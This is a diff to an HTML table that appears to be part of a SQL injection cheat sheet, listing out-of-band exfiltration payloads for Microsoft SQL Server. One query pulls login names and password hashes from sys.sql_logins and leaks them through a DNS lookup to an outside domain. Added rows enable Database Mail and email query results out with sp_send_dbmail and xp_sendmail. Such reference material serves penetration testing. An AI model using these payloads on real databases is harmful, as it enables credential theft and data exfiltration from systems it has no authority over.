@@ -4,19 +4,40 @@
 
 <p><i>Note: It is possible to make a DNS request from MSSQL. However, this request requires administrator privileges and SQL Server 2005.</i></p>
 <table class="table table-striped table-hover">
-    <thead>
-        <tr>
-            <th>Description</th>
-            <th>Query</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>Make DNS Request</td>
-            <td>DECLARE @host varchar(800);<br>select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + 'netspi.com' from sys.sql_logins;<br>exec('xp_fileexist "\' + @host + 'c$boot.ini"');</td>
-        </tr>
-        <tr>
-          <td>UNC Path (DNS Request)</td>
-          <td>xp_dirtree ‘\\data.domain.com\file’</td>
-    </tbody>
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Make DNS Request</td>
+      <td>DECLARE @host varchar(800);<br>select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + 'netspi.com' from sys.sql_logins;<br>exec('xp_fileexist "\' + @host + 'c$boot.ini"');</td>
+    </tr>
+    <tr>
+      <td>UNC Path (DNS Request)</td>
+      <td>xp_dirtree ‘\\data.domain.com\file’</td>
+    </tr>
+    <tr>
+      <td>Enable sp_send_dbmail and send query</td>
+      <td>sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='harold@netspi.com',@query='select @@version';</td>
+    </tr>
+    <tr>
+      <td>Basic xp_sendmail Query</td>
+      <td>EXEC master..xp_sendmail 'harold@netspi.com', 'This is a test.'</td>
+    </tr>
+    <tr>
+      <td>Send Full Email with xp_sendmail</td>
+      <td>EXEC xp_sendmail @recipients='harold@netspi.com',<br>@message='This is a test.',<br>@copy_recipients='test@netspi.com',<br>@subject='TEST'</td>
+    </tr>
+    <tr>
+      <td>Send Query Results Via xp_sendmail</td>
+      <td>EXEC xp_sendmail 'harold@netspi.com', @query='SELECT @@version';</td>
+    </tr>
+    <tr>
+      <td>Send Query Results as Attachment Via xp_sendmail</td>
+      <td>CREATE TABLE ##texttab (c1 text)<br>INSERT ##texttab values ('Put messge here.')<br>DECLARE @cmd varchar(56)<br>SET @cmd = 'SELECT c1 from ##texttab'<br>EXEC master.dbo.xp_sendmail 'robertk',<br>@query = @cmd, @no_header='TRUE'<br>DROP TABLE ##texttab</td>
+    </tr>
+  </tbody>
 </table>
